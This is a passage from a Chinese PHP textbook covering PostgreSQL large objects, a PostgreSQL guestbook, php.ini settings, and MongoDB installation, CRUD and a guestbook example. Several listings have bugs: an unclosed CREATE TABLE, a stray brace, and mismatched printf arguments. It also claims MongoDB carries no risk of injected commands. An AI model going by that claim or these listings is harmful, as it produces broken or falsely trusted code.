在其他数据库中称为 LOB 或 BLOB 的东西，在这里称为 lo（也即 _大型对象_）。可以在这类数据字段中存储更广泛的数据，例如文件。在实现此功能之前，必须克服一些障碍（即，必须调用一些 PHP 函数）。

插入分为多个步骤：

- 1. 创建带有 oid 类型列的表。
- 2. 使用 pg_lo_create() 创建 OID。这将稍后用作对文件的引用。
- 3. 将 OID 插入新表中。
- 4. 使用 pg_lo_open() 打开 lo。为此，请指定数据库连接（pg_connect() 的返回值）、OID 和文件模式（“w”表示写入，当然）。
- 5. 使用 pg_lo_write() 将数据写入 lo——例如，从使用 file_get_contents() 读取的文件中。
- 6. 使用 pg_lo_close() 关闭 lo。如果不这样做，连接将关闭且信息将丢失！
- 7. 使用 pg_close() 关闭到数据库的连接。

> **注意**
>
> 必须在事务中执行整个过程——即使用 BEGIN 和 COMMIT。但是，后者是可选的，因为 PHP 脚本结束时会自动执行 COMMIT。




下面的完整清单创建并填充所需的表格。

```php
<?php
if ($db = pg_connect("host=localhost port=5432 dbname=PHP user=postgres
      password=pwd.")) {
  $data = file_get_contents(__FILE__);
  pg_query ($db, "CREATE TABLE files (
        obj_id oid,
        name VARCHAR(255)
  )");
  pg_query ($db, "BEGIN");
  $oid = pg_lo_create($db);
  $file = pg_escape_string(__FILE__);
  $result = pg_query($db,
        "INSERT INTO files (obj_id, name) VALUES ($oid, '$file')");
  $lo = pg_lo_open($db, $oid, "w");
  pg_lo_write($lo, $data);
  pg_lo_close($lo);
  pg_query($db, "COMMIT");
  pg_close($db);
  echo "File inserted.";
} else {
  echo "Error!";
}
?>
```

清单 23.11 文件已写入数据库 ... ("pgsql-lo-write.php")

查看 pgAdmin 等管理工具，可以发现 OID 实际上已写入 obj_id 列（参见图 23.7）。每个表元素也有一个 OID，它（当然）是不同的，但在当前版本的 pgAdmin 4 中并未明确显示。

读取数据需要几个步骤（参见图 23.8）：

- 1. 从表中读取一个 OID。
- 2. 使用 pg_lo_open() 打开 lo。文件模式现在为 "r"，用于读取。
- 3. 使用 pg_lo_read() 读取文件内容，或使用 pg_lo_read_all() 将其完整直接返回到 Web 浏览器。
- 4. 使用 pg_lo_close() 关闭 lo。
- 5. 使用 pg_close() 关闭到数据库的连接。

![](img/ae7820c36e8f24c1623d26668b28e80e_673_0.png)

图 23.7 数据库中只有 OID

![](img/ae7820c36e8f24c1623d26668b28e80e_673_1.png)

图 23.8 之前的文件已输出

下面的相应清单读取并输出刚插入的文件。

```php
<?php
if ($db = pg_connect("host=localhost port=5432 dbname=PHP user=postgres
password=pwd.")) {
    pg_query($db, "BEGIN");
    $result = pg_exec($db,
        "SELECT obj_id FROM files WHERE name LIKE
        '%pgsql-lo-write.php%'");
    $row = pg_fetch_assoc($result);
    $lo = pg_lo_open($db, $row["obj_id"], "r");
    pg_lo_read_all($lo);
    pg_lo_close($lo);
    pg_query($db, "COMMIT");
    pg_close($db);
} else {
    echo "Error!";
}
?>
```

清单 23.12 ... 并再次读取 ("pgsql-lo-read.php")

## 23.3 应用示例

此处的示例与所有其他数据库章节中的示例相同；区别在于细节。

### 23.3.1 创建表

表通过调用 CREATE TABLE 按常规方式创建。还应注意，特殊的 PostgreSQL 数据类型 SERIAL 用于自动值。

```php
<?php
if ($db = pg_connect("host=localhost port=5432 dbname=PHP user=postgres
password=pwd.")) {
    $sql = "CREATE TABLE guestbook (
    id SERIAL PRIMARY KEY,
    heading VARCHAR(1000),
    entry VARCHAR(8000),
    author VARCHAR(50),
    email VARCHAR(100),
    date TIMESTAMP
");
if (pg_query($db, $sql)) {
    echo "Table created.<br />";
} else {
    echo "Error: ". pg_last_error() . "!";
}
pg_close($db);
} else {
    echo "Error!";
}
?>
```

清单 23.13 表已创建 ("gb-create.php")

### 23.3.2 输入数据

输入数据时会遇到第一个潜在困难。如果遵循其他章节中的相同过程，当输入包含元音变音符号等特殊字符时，可能会收到一条晦涩的错误消息。如图 23.9 所示。

![](img/ae7820c36e8f24c1623d26668b28e80e_675_0.png)

图 23.9 特殊字符的可能错误消息

原因：PostgreSQL 使用 Unicode，因此您还必须确保数据库接收的是 Unicode。如果将 php.ini 的 default_charset 设置设为 "UTF-8"，这应该有帮助。否则，只需在将表单输入发送到数据库之前，使用 utf8_encode()（当然还要使用 pg_escape_string()）处理所有表单输入。这样插入也会起作用。在以下清单中，我们手动执行 UTF-8 编码，以便您可以看到这种方法。如果对您来说似乎不起作用，请删除这些调用，改为设置默认字符集。

另一个特殊功能是确定最后插入元素的自动值。如我们在第 23.2.4 节中已提到，可以使用 pg_last_oid() 来确定 oid 列的值。然后启动另一个 SELECT 查询以获取 id 列中的值：

```php
$oid = pg_last_oid($result);
$result = pg_query($db, "
SELECT id FROM guestbook WHERE oid=$oid");
$row = pg_fetch_row($result);
$id = $row[0];
```

出于前面提到的原因，您以后需要 id 列来进行编辑；oid 中的值不够。在以下完整清单中，特殊功能以粗体突出显示。

```php
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
if (isset($_POST["Name"]) &&
    isset($_POST["Email"]) &&
    isset($_POST["Heading"]) &&
    isset($_POST["Comment"])) {
if ($db = pg_connect("host=localhost port=5432
dbname=PHP user=postgres password=pwd.")) {
$sql = vsprintf("INSERT INTO guestbook
(heading,
entry,
author,
email,
date)
VALUES ('%s', '%s', '%s', '%s', '%s')", [
pg_escape_string(utf8_encode($_POST["Heading"])),
pg_escape_string(utf8_encode($_POST["Comment"])),
pg_escape_string(utf8_encode($_POST["Name"])),
pg_escape_string(utf8_encode($_POST["Email"])),
date("Y-m-d H:i")
]);
if ($result = pg_query($db, $sql)) {
$oid = pg_last_oid($result);
$result = pg_query($db,
"SELECT id FROM guestbook WHERE oid=$oid");
$row = pg_fetch_row($result);
$id = $row[0];
echo "Entry added.<a href=\"gb-edit.php?id=$id\">Edit</a>";
} else {
echo "Error: " . pg_last_error() . "!";
}
pg_close($db);
} else {
echo "Error!";
}
}
?>
<form method="post" action="">
Name <input type="text" name="Name" /> <br />
Email address <input type="text" name="Email" /> <br />
Heading <input type="text" name="Heading" /> <br />
Comment
<textarea cols="70" rows="10" name="Comment"></textarea><br />
<input type="submit" name="Submit" value="Submit" />
</form>
</body>
</html>
```

清单 23.14 可以输入数据 ("gb-enter.php")

### 23.3.3 输出数据

读取数据时必须反转数据的 UTF-8 编码；相应的 PHP 函数名为 utf8_decode()。以下清单显示了此目的的完整代码。

```html
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
if ($db = pg_connect("host=localhost port=5432 dbname=PHP user=postgres
password=pwd.")) {
$sql = "SELECT * FROM guestbook ORDER BY date DESC";
$result = pg_query($db, $sql);
while ($line = pg_fetch_object($result)) {
printf("<p><a href=\"mailto:%s\">%s</a> wrote on %s:</p>
<h3>%s</h3><p>%s</p>\n",
urlencode(utf8_decode($line->email)),
htmlspecialchars(utf8_decode($line->author)),
htmlspecialchars(utf8_decode($line->date)),
htmlspecialchars(utf8_decode($line->heading)),
nl2br(htmlspecialchars(utf8_decode($line->entry)))
);
}
pg_close($db);
} else {
echo "Error!";
}
?>
</body>
</html>
```

清单 23.15 已输出留言簿数据 ("gb-show.php")

如果忘记 `utf8_decode()`，则特殊字符可能无法正确显示。

### 23.3.4 删除数据

管理脚本在双击后向数据库发送 `DELETE` 命令。输出所有留言簿数据时，请务必使用 `utf8_decode()` 正确转换特殊字符。

```html
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
if (isset($_GET["id"]) && is_numeric($_GET["id"])) {
if (isset($_GET["ok"])) {
if ($db = pg_connect("host=localhost port=5432 dbname=PHP user=postgres
password=pwd.")) {
$id = pg_escape_string($_GET["id"]);
$sql = "DELETE FROM guestbook WHERE id=$id";
if (pg_query($db, $sql)) {
echo "<p>Entry deleted.</p>
<p><a href=\"gb-admin.php\">Back to overview
</a></p>";
} else {
echo "Error: " . pg_last_error() . "!";
}
pg_close($db);
} else {
echo "Error!";
}
} else {
printf("<a href=\"gb-admin.php?id=%s&ok=1\">Really delete?</a>",
urlencode($_GET["id"]));
}
} else {
if ($db = pg_connect("host=localhost port=5432 dbname=PHP user=postgres
password=pwd.")) {
$sql = "SELECT * FROM guestbook ORDER BY date DESC";
$result = pg_query($db, $sql);
while ($row = pg_fetch_object($result)) {
printf("<a href=\"gb-admin.php?id=%s\">Delete this entry</a> <a href=\"gb-admin.php?id=%s\">Edit this entry</a></p>
<p><a href=\"mailto:%s\">%s</a> wrote on at %s:</p>
<h3>%s</h3><hr noshade=\"noshade\" />\n",
urlencode($row->id),
urlencode($row->id),
htmlspecialchars(utf8_decode($row->email)),
htmlspecialchars(utf8_decode($row->author)),
htmlspecialchars(utf8_decode($row->date)),
htmlspecialchars(utf8_decode($row->heading)),
nl2br(htmlspecialchars(utf8_decode($row->entry)))
);
}
pg_close($db);
} else {
echo "Error!";
}
}
?>
</body>
</html>
```

清单 23.16 带删除选项的所有数据显示 ("gb-admin.php")

### 23.3.5 编辑数据

最后，必须创建带有编辑选项的表单。这里需要在两个地方注意 Unicode 字符。从数据库读取数据以供显示时必须使用 utf8_decode()，写回时必须使用 utf8_encode()。其余代码与其他数据库模块完全类似，因此该示例可以非常快速地实现。




```html
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
$Name = "";
$Email = "";
$Heading = "";
$Comment = "";
if (isset($_GET["id"]) &&
is_numeric($_GET["id"])) {
if ($db = pg_connect("host=localhost port=5432 dbname=PHP user=postgres password=pwd")) {
if (isset($_POST["Name"]) &&
isset($_POST["Email"]) &&
isset($_POST["Heading"]) &&
isset($_POST["Comment"])) {
$sql = vsprintf(
"UPDATE guestbook SET
heading = '%s',
entry = '%s',
author = '%s',
email = '%s'
WHERE id=%s",
[
pg_escape_string(utf8_encode($_POST["Heading"])),
pg_escape_string(utf8_encode($_POST["Comment"])),
pg_escape_string(utf8_encode($_POST["Name"])),
pg_escape_string(utf8_encode($_POST["Email"])),
pg_escape_string($_GET["id"])
]);
if (pg_query($db, $sql)) {
echo "<p>Entry changed.</p>
<p><a href=\"gb-admin.php\">Back to overview
</a></p>";
} else {
echo "Error: " . pg_last_error() . "!";
}
}
$sql = sprintf("SELECT * FROM guestbook WHERE id=%s",
pg_escape_string($_GET["id"]));
$result = pg_query($db, $sql);
if ($row = pg_fetch_object($result)) {
    $Name = utf8_decode($row->author);
    $Email = utf8_decode($row->email);
    $Heading = utf8_decode($row->heading);
    $Comment = utf8_decode($row->entry);
}
pg_close($db);
} else {
    echo "Error!";
}
}
?>
<form method="post" action="">
Name <input type="text" name="Name" value="<?php
echo htmlspecialchars($Name);
?>" /><br />
Email address <input type="text" name="Email" value="<?php
echo htmlspecialchars($Email);
?>" /><br />
Heading <input type="text" name="Heading" value="<?php
echo htmlspecialchars($Heading);
?>" /><br />
Comment
<textarea cols="70" rows="10" name="Comment"><?php
echo htmlspecialchars($Comment);
?></textarea><br />
<input type="submit" name="Submit" value="Update" />
</form>
</body>
</html>
```

### 清单 23.17 编辑留言簿条目 ("gb-edit.php")

### 23.4 设置

php.ini 配置文件包含表 23.1 中列出的设置选项。

| 参数 | 描述 | 默认值 |
| :--- | :--- | :--- |
| pgsql.allow_persistent | 指示是否允许持久连接 | "1" |
| pgsql.auto_reset_persistent | 指定是否应自动重置已终止的持久连接 | "0" |
| pgsql.ignore_notice | 指定是否应忽略警告（不是错误消息！） | "0" |
| pgsql.log_notice | 指定是否应记录警告消息（如果 pgsql.ignore_notice="0"） | "0" |
| pgsql.max_links | 最大连接数 | "-1"（不限） |
| pgsql.max_persistent | 最大持久连接数 | "-1" |

表 23.1 "php.ini" 中的配置参数

# 第 24 章

MongoDB

不使用 SQL 的数据库：直到不久以前，这仍是不可想象的事，但如今已成为一种被接受的替代方案。MongoDB 是“NoSQL”运动中最知名的代表之一。

以表为基础并以 SQL 作为查询语言的关系数据库几十年来一直是行业标准。然而，近年来，出现了依赖不同模型的现代替代方案，通常称为 NoSQL（nomen est omen）。数据记录不再存储在关系和表中，而是—通常以 JSON 格式的变体，但原则上是以名称-值对的形式—存储。根据应用程序类型，这可能是一种替代方案。由于 NoSQL 数据库的动态特性，数据集成可能比 MySQL 等经典数据库更容易管理。

我们本可以在此不遗余力地讨论利弊——但当然这并非本书主题。我们也同样可以争论 PHP 等动态语言是否优于或劣于 Java 或 C# 等更严格的类型替代方案。

相反，我们来看看目前最知名的 NoSQL 数据库代表，并以与之前数据库章节类似的方式介绍常见功能。

## 24.1 准备工作

所涉及的数据库是 MongoDB。它最初由 10gen 公司开发。由于取得巨大成功，该公司将名称改为 MongoDB Inc.。该数据库本身是开源的，可在多种平台上使用，并且保证有良好的 PHP 支持。Derick Rethans（PHP DateTime 扩展的作者之一）曾一度受雇于 MongoDB Inc.，负责 PHP 与 MongoDB 的连接。

要从 PHP 访问 MongoDB，必须先安装数据库。MongoDB Inc. 的主页 www.mongodb.com 包含所需的一切，包括可直接使用的软件包和各种系统的二进制文件。图 24.1 显示了 Windows 的安装程序，例如。不要被对云托管版本的提及误导：选择下载 MongoDB Community Server（如果要求选择部署类型，请选择 On-Premise）。

![](img/ae7820c36e8f24c1623d26668b28e80e_684_0.png)

图 24.1 面向 Windows 的 MongoDB 安装程序

重要的安装步骤是指定 MongoDB 运行所在的用户以及存储数据库的目录（参见图 24.2）。安装程序会将所选用户的写入权限授予该文件夹，因此您应仔细考虑是否真的想为此目的使用程序目录。

> **提示**
>
> MongoDB Compass 管理软件也可以作为安装的一部分进行安装，它为 MongoDB 数据库提供了一个有用的图形用户界面。不过，您也可以稍后从 http://s.prs.co/v602235 下载它。

安装后，目标目录中有一些可执行文件（在 Windows 下，这些是 .exe 文件；否则，它们没有扩展名）：

- mongod
    数据库服务，因此是最重要的组件
- mongo
    用于管理和操作数据库的交互式 shell
- mongodump
    用于创建数据库转储（备份）
- mongorestore
    用于恢复转储
- mongoexport
    用于导出数据库数据（例如，以 JSON 格式）
- mongoimport
    用于导入数据库数据（例如，以 JSON 格式）
- mongostat
    提供有关 MongoDB 实例的状态信息
- mongotop
    提供有关单个 MongoDB 数据存储的状态信息

![](img/ae7820c36e8f24c1623d26668b28e80e_685_0.png)

图 24.2 选择用户和数据目录

因此，您必须启动 mongod MongoDB 守护进程，除非您在安装期间选择了为 MongoDB 安装服务。在这种情况下，使用操作系统的服务管理更方便（参见图 24.3）。

关于适用于 MongoDB 的 PHP 扩展，您需要小心：名为 mongo 的扩展是旧版扩展（不兼容 PHP 7 及更高版本）。MongoDB 本身有一个官方扩展，原则上允许 PHP 与 MongoDB 服务器通信。不过，使用基于 PHP 扩展的 PHP 库更方便。

首先，虽然 PHP 在线手册（http://php.net/mongodb）中甚至有关于 MongoDB 的信息，但 MongoDB 的数据库扩展不是标准发行版的一部分。该扩展位于 PECL 中。相应的软件包是 https://pecl.php.net/package/mongodb，但该软件包的实际主页可在 https://www.mongodb.com/docs/drivers/php 找到。在后者中，您还会找到指向托管在 GitHub¹ 上的源代码的链接以及更多详细信息。

```
pecl install mongodb
```

¹ 参见 http://s-prs.co/v602237

![](img/ae7820c36e8f24c1623d26668b28e80e_686_0.png)

图 24.3 安装后 MongoDB 服务将自动运行

Windows 用户可以在 http://pecl.php.net/package/mongodb 的项目页面上访问 PECL。在项目发行版列表中，通常有一个标记为 DLL 的链接，可通往文件列表。在链接缺失的情况下，GitHub 页面能通往目标。在 http://s-prs.co/v602236 上，有针对各种 PHP 版本的 Windows 扩展版本：适用于 32 位和 64 位 PHP，以及线程安全（适用于 Apache 等）和非线程安全（适用于 IIS）选项。

扩展的集成照常进行：将扩展（php_mongodb.dll）放置在 PHP 的扩展目录（例如 ext）中，然后在 php.ini 中加载该扩展，可以使用完整文件名，也可以使用众所周知的简称：

```
extension=php_mongodb.dll
extension=mongodb
```

最后，phpinfo() 的输出中包含一个来自 MongoDB 的条目（参见图 24.4）。

> **注意**
>
> 发布新的 PHP 版本时，MongoDB 扩展有时会滞后，可以通过控制台中按照以下模式出现的错误消息来识别：
>
> Warning: PHP Startup: mongodb: Unable to initialize module
> Module compiled with module API=20210902
> PHP compiled with module API=20230831
>
> 在这种情况下，只有耐心才有帮助。





图 24.4 MongoDB 扩展已正确安装

![](img/ae7820c36e8f24c1623d26668b28e80e_687_0.png)

这完成了准备工作，现在我们可以从 PHP 访问数据库。刚刚安装的扩展仅提供基础功能。使用 MongoDB PHP 库（同样由 MongoDB Inc. 维护）更加方便。源代码可在 http://s.prs.co/v602238 找到，详细文档可在 http://s.prs.co/v602239 查阅。

MongoDB PHP 库通过 Composer 安装，我们将在第 38 章中详细介绍。如果您尚未使用过 Composer，如有需要可跳过。在当前目录中使用以下命令安装 MongoDB PHP 库：

```
composer require mongodb/mongodb
```

这样在当前目录下会生成一个名为 vendor 的子文件夹和一个名为 autoload.php 的文件。如果通过 require 引入该文件，MongoDB PHP 库将自动加载——正如文件名所暗示的那样。本章的代码示例中不包含 MongoDB PHP 库（因为随时可能有新版本），但它是先决条件。

> **注意**
>
> 在尝试安装 MongoDB PHP 库时，您可能会收到类似于图 24.5 所示的错误信息。一个可能的原因是，Composer 正在查找旧的 MongoDB 扩展，而忽略了新扩展已正确安装的事实。以下命令告诉 Composer 特定版本的扩展可用。安装随后应该能够完成。在以下代码中，将 1.9.0 替换为您使用的 MongoDB 扩展的实际版本号：

composer config "platform.ext-mongo" "1.9.0"

![](img/ae7820c36e8f24c1623d26668b28e80e_688_0.png)

图 24.5 MongoDB PHP 库（暂时）无法安装

所有准备工作终于完成了——让我们开始实际编程吧！

## 24.2 使用 MongoDB 进行数据库访问

作为 NoSQL 数据库，MongoDB 与通常的关系型系统工作方式略有不同。特别是，术语也不同，因为存储的是 *文档* 而不是 *数据记录*—更不用说关系了。出于此原因，表 24.1 对一些术语进行了比较。

| 关系型数据库 | MongoDB |
|---|---|
| 数据库 | 数据库 |
| 表 | 集合 |
| 数据集 | 对象/文档 |

表 24.1 关系型数据库与 MongoDB 术语对比

因此，我们首先需要一个数据库，在其中创建一个集合，然后将文档（或对象）插入其中。

### 24.2.1 连接设置

默认情况下，MongoDB 在本地计算机的 27017 端口下运行。这也是 PHP 扩展默认所需的设置。由于数据库的动态特性，控制方式有些不同寻常。以下清单在本地服务器上创建一个名为 PHP 的数据库。

```php
<?php
require_once __DIR__ . "/vendor/autoload.php";

try {
    $conn = new MongoDB\Client();
    $db = $conn->PHP;
    echo "Database created.<br />";
} catch (Exception $sex) {
    echo "Error: " . $sex->getMessage();
}
?>
```

清单 24.1 建立与数据库的连接（"mongo-connect.php"）

MongoDB\Client 类的初始化建立了与 localhost 和 27017 端口下数据库的连接。访问 $conn->PHP 访问 PHP 数据库。如果该数据库尚不存在，它会立即创建！因此，您在这里已经可以看到系统的灵活性——无论是好是坏。

> **注意**
>
> 构造函数接受三个参数，均为可选：
>
> 1. 服务器—默认值 "mongodb://localhost:27017"
> 2. 建立连接的选项，例如身份验证信息
> 3. 数据库扩展的选项；SSL/TLS 的证书信息

要创建表——在 MongoDB 术语中称为集合——可以调用 createCollection() 方法。如果调用成功，您可以直接通过 $conn->PHP->table 访问 PHP 数据库中的表集合，例如。

```php
<?php
require_once __DIR__ . "/vendor/autoload.php";

try {
    $conn = new MongoDB\Client();
    $db = $conn->PHP;
    $db->createCollection("my_table");
    echo "Table created.<br />";
// Access now via $conn->PHP->my_table
} catch (Exception $ex) {
echo "Error: " . $ex->getMessage();
}
}?>
```

清单 24.2 创建集合（"mongo-create.php"）

### 24.2.2 插入

如已解释，MongoDB 以“文档”进行思考。此类文档本质上是带有原始属性的对象——例如 JavaScript 环境中的 JSON 或 PHP 中的增强型 StdClass（但在后一种情况下，请记住，自 PHP 8.2 起，向 StdClass 动态添加类属性已被弃用）。本质上，您创建一个关联的、可能是嵌套的数组并将其插入。因此，关于架构，您不受约束，或必须自己确保数据结构足够一致以支持搜索。

输入数据非常简单；集合为此目的提供 insertOne() 方法。数据通过引用传递。

```php
<?php
require_once __DIR__ . "/vendor/autoload.php";
try {
$conn = new MongoDB\Client();
$db = $conn->PHP->my_table;
$data = [
"name1" => "value1",
"name2" => "value2"
];
$result = $db->insertOne($data);
echo "Data entered.<br />";
echo "<pre>". print_r($result, true). "</pre>";
} catch (Exception $ex) {
echo "Error: " . $ex->getMessage();
}
?>
```

清单 24.3 将数据写入数据库（"mongo-insert.php"）

如果查看 insertOne() 的返回值，会变得有趣。如图 24.6 所示，您将收到 MongoDB\BSON\ObjectId 类型的唯一对象 ID oid。

这类似于 MySQL 和其他数据库中的自增值，但在此情况下它是更长的 GUID 而不是简单的数字。本章稍后，我们将能够通过此直接访问单个数据记录。

```
Data entered.

MongoDB\InsertOneResult Object
(
    [writeResult:MongoDB\InsertOneResult:private] => MongoDB\Driver\WriteResult Object
    (
        [nInserted] => 1
        [nMatched] => 0
        [nModified] => 0
        [nRemoved] => 0
        [nUpserted] => 0
        [upsertedIds] => Array
        (
        )

        [writeErrors] => Array
        (
        )

        [writeConcernError] =>
        [writeConcern] => MongoDB\Driver\WriteConcern Object
        (
        )

        [errorReplies] => Array
        (
        )
    )

    [insertedId:MongoDB\InsertOneResult:private] => MongoDB\BSON\ObjectId Object
    (
        [oid] => 67783996de48a9979e05d193
    )
)
```

图 24.6 关于插入数据的信息—包括生成的 ID

> **注意**
>
> 因此，插入数据没有类似 SQL 的查询语言。就此而言，您无需转义任何特殊字符以避免 SQL 注入，例如；在 MongoDB 中不存在此问题。特殊字符仅在选择、更新或删除数据时用于特定条件。不存在危险命令被注入的风险，例如在第 32 章中所示。

### 24.2.3 查询和返回值

查询数据库中所有文档（或数据）起初很简单：集合的 find() 方法首先返回所有文档，您可以随后使用 foreach 遍历它们。如果这些文档随后具有统一的架构，输出也会简化（参见图 24.7）。

```php
<?php
require_once __DIR__ . "/vendor/autoload.php";

try {
    $conn = new MongoDB\Client();
    $db = $conn->PHP->my_table;
    $result = $db->find();
    echo "<table><tr><th>name1</th><th>name2</th></tr>";
    foreach ($result as $id => $row) {
        printf("<tr><td>%s</td><td>%s</td></tr>",
            htmlspecialchars($row["name1"]),
            htmlspecialchars($row["name2"])
        );
    }
} catch (Exception $x) {
    echo "Error: " . $x->getMessage();
}
?>
```

清单 24.4 输出集合的所有数据（"mongo-read-all.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_692_0.png)

图 24.7 输出数据时

如果您只想访问特定数据，必须将相应的搜索条件传递给 find() 方法。MongoDB 在此支持非常强大的查询语言。然而，最简单的搜索方式是传递带有属性和所需值的关联数组。因此，以下查询会搜索在 Name1 属性中包含 "Value1" 值，并在 Name2 中相应包含 "Value2" 值的所有数据记录：

```
$db = $conn->PHP->my_table;
$result = $db->find(
    ["name1" => "value1", "name2" => "value2"]
);
```





请参考以下完整清单。

```php
<?php
require_once __DIR__ . "/vendor/autoload.php";

try {
    $conn = new MongoDB\Client();
    $db = $conn->PHP->my_table;
    $result = $db->find([
        "name1" => "value1", "name2" => "value2"
    ]);
    echo "<table><tr><th>name1</th><th>name2</th></tr>";
    foreach ($result as $id => $row) {
        printf("<tr><td>%s</td><td>%s</td></tr>",
            htmlspecialchars($row["name1"]),
            htmlspecialchars($row["name2"]));
    }
} catch (Exception $ex) {
    echo "Error: " . $ex->getMessage();
}
?>
```

清单 24.5 查询并输出集合数据 ("mongo-read.php")

> **注意**
> 
> 如果你只期望查询返回一条数据记录（或只需要所有返回文档中的第一条），请使用 `findOne()` 而非 `find()`。语法保持不变。

最后有个重要提示：如果你想使用文档的 ID 作为搜索条件，则必须小心。如图 24.6 所示，存在一个 ID——不是作为简单的字符串值，而是作为 `ObjectID` 类型的对象。因此，在比较条件时，你还必须指定一个 `ObjectID` 实例，包括完整的命名空间。相关属性称为 `_id`：

```php
$result = $db->find([ "_id" => new MongoDB\BSON\ObjectID("abc123") ]);
```

### 24.2.4 刷新

要更新现有条目，MongoDB 使用 `updateOne()` 和 `updateMany()` 方法，具体取决于你只想更改一条还是多条数据记录。作为 `updateOne()` 的替代方案，你也可以使用 `replaceOne()`。此方法替换完整的数据记录；而 `updateOne()` 则可以在不破坏现有数据的前提下添加额外字段。这些函数首先期望类似 find() 和 findOne() 的搜索条件，然后是要用于替换找到记录的新文档。语法有些特殊：$set 数组键用于指定值的写入。MongoDB 还在此提供了一些其他选项，例如用于更新的特殊运算符。在下面的清单中，我们将简单地插入另一条数据记录。

```php
<?php
require_once __DIR__ . "/vendor/autoload.php";

try {
    $conn = new MongoDB\Client();
    $db = $conn->PHP->my_table;
    $db->updateOne(
        ["name1" => "value1"], //Search criterion
        ["\$set" => ["name1" => "value3", "name2" => "value4"]] //New document
    );
    $result = $db->find();
    echo "<table><tr><th>name1</th><th>name2</th></tr>";
    foreach ($result as $id => $row) {
        printf("<tr><td>%s</td><td>%s</td></tr>",
            htmlspecialchars($row["name1"]),
            htmlspecialchars($row["name2"])
        );
    }
} catch (Exception $ex) {
    echo "Error: " . $ex->getMessage();
}
?>
```

清单 24.6 更新集合数据 ("mongo-update.php")

图 24.8 显示了结果。

![](img/ae7820c36e8f24c1623d26668b28e80e_694_0.png)

图 24.8 数据已更新

### 24.2.5 删除

最后，数据也可以从 MongoDB 数据库中删除。在之前的解释之后，该过程可能不再是什么大惊喜。deleteOne() 方法负责删除一条数据记录，而 deleteMany() 则一次性删除多条数据记录。搜索条件再次作为参数期望。清单 24.7 包含完整代码。

```php
<?php
require_once __DIR__ . "/vendor/autoload.php";

try {
    $conn = new MongoDB\Client();
    $db = $conn->PHP->my_table;
    $db->deleteOne(
        ["name1" => "value3"] //search criterion
    );
} catch (Exception $ex) {
    echo "Error: " . $ex->getMessage();
}
?>
```

清单 24.7 删除集合数据 ("mongo-delete.php")

这就是对 MongoDB PHP 控制的初步了解。http://php.net/mongodb 上的在线手册包含完整且详细的 API 描述。

## 24.3 应用示例

为结束本章——以及整个数据库部分——我们基于 MongoDB 实现了众所周知的留言本示例。应用程序的基本结构保持不变，但数据库通信是根据前面页面的信息进行的。只更改了少数细节。

### 24.3.1 创建数据内存

我们假设应用程序的默认值：运行的 MongoDB 实例位于当前服务器上，使用默认端口，且无需额外身份验证。我们在 PHP 数据库（可能已从前面的示例中存在）中创建一个新的留言本集合一次。正如已讨论的，我们不需要数据库架构。

```php
<?php
require_once __DIR__ . "/vendor/autoload.php";

try {
    $conn = new MongoDB\Client();
    $db = $conn->PHP;
    $db->createCollection("guestbook");
    echo "Database created.<br />";
} catch (Exception $ex) {
    echo "Error: " . $ex->getMessage();
}
?>
```

清单 24.8 集合已创建 ("gb-create.php")

### 24.3.2 输入数据

创建数据存储后，我们使用常用的 HTML 界面进行数据输入。有一个特殊功能：MongoDB 基于 UTF-8 工作，因此我们相应地使用 utf8_encode() 对输入进行编码。² 从此我们创建一个简单的关联数组，然后直接将其发送到 MongoDB：

```php
$data = [
    "heading" => utf8_encode($_POST["Heading"]),
    "entry" => utf8_encode($_POST["Comment"]),
    "author" => utf8_encode($_POST["Name"]),
    "email" => utf8_encode($_POST["Email"]),
    "date" => time()
];
$result = $db->insertOne($data);
```

插入后，我们可以使用 getInsertedId() 方法来确定生成的自动值。如前面所述，这属于 ObjectID 类型。但是，字符串表示形式即为 ID 值本身，因此我们可以像下面这样将其追加到 URL 中：

```php
$id = $result->getInsertedId();
echo "Entry added. <a href=\"gb-edit.php?id=$id\">Edit</a>";
```

请参考以下完整清单。

```php
<html>
<head>
    <title>Guestbook</title>
</head>
<body>
    <h1>Guestbook</h1>
<?php
if (isset($_POST["Name"]) &&
    isset($_POST["Email"]) &&
    isset($_POST["Heading"]) &&
    isset($_POST["Comment"])) {
    require_once __DIR__ . "/vendor/autoload.php";

    try {
    $conn = new MongoDB\Client();
    $db = $conn->PHP->guestbook;
    $data = [
        "heading" => utf8_encode($_POST["Heading"]),
        "entry" => utf8_encode($_POST["Comment"]),
        "author" => utf8_encode($_POST["Name"]),
        "email" => utf8_encode($_POST["Email"]),
        "date" => time()
    ];
    $result = $db->insertOne($data);
    $id = $result->getInsertedId();
    echo "Entry added.
    <a href=\"gb-edit.php?id=$id\">Edit</a>";
    } catch (Exception $ex) {
    echo "Error: " . $ex->getMessage();
    }
}
?>
<form method="post" action="">
Name <input type="text" name="Name" /><br />
Email address <input type="text" name="Email" /><br />
Heading <input type="text" name="Heading" /><br />
Comment
<textarea cols="70" rows="10" name="Comment"></textarea><br />
<input type="submit" name="Submit" value="Submit" />
</form>
</body>
</html>
```

² 在完全依赖 UTF-8 的系统上，此步骤可能不是必需的。在这种情况下，你可以删除对 utf8_encode() 的调用——以及下一个清单中 utf8_decode() 的调用。

清单 24.9 可以输入数据 ("gb-enter.php")

### 24.3.3 输出数据

输出所有数据是小菜一碟——即使与其他数据库系统相比也是如此：find() 返回所有文档，我们通过 foreach 遍历它们。我们仍需考虑的唯一事项是使用 utf8_decode() 对数据进行 UTF-8 解码。

```php
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
require_once __DIR__ . "/vendor/autoload.php";
try {
$conn = new MongoDB\Client();
$db = $conn->PHP->guestbook;
$result = $db->find();
foreach ($result as $id => $row) {
printf("<p><a href=\"mailto:%s\">%s</a> wrote on at %s:</p>
<h3>%s</h3><p>%s</p><hr noshade=\"noshade\" />",
urlencode(utf8_decode($row["email"])),
htmlspecialchars(utf8_decode($row["author"])),
htmlspecialchars(date("Y-m-d, H:i", $row["date"])),
htmlspecialchars(utf8_decode($row["heading"])),
nl2br(htmlspecialchars(utf8_decode($row["entry"])))
);
}
} catch (Exception $ex) {
echo "Error: " . $ex->getMessage();
}
?>
</body>
</html>
```

清单 24.10 输出留言本数据 ("gb-show.php")

### 24.3.4 删除数据

